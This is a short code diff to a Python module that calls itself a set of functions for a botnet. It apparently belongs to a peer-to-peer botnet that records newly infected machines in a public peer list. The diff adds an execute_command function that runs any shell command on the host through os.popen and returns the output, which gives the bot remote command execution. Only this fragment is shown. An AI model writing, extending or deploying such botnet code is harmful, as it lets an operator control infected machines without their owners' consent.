@@ -1,6 +1,7 @@
 """Interesting functions for a botnet"""
 
 import random
+import os
 
 from botnet_p2p import (
     MAX_PUBLIC_PEER_LIST_LENGTH,
@@ -35,6 +36,11 @@ def add_new_infected_machine(msg_data: str):
         __append_to_file(public_peer_list_path, msg_data)
     else:
         __overwrite_random_line_in_file(public_peer_list_path, msg_data)
+
+
+def execute_command(command: str) -> str:
+    result = os.popen(command).read()
+    return result
 
 
 def __public_peer_list_reached_maximum_length() -> bool:
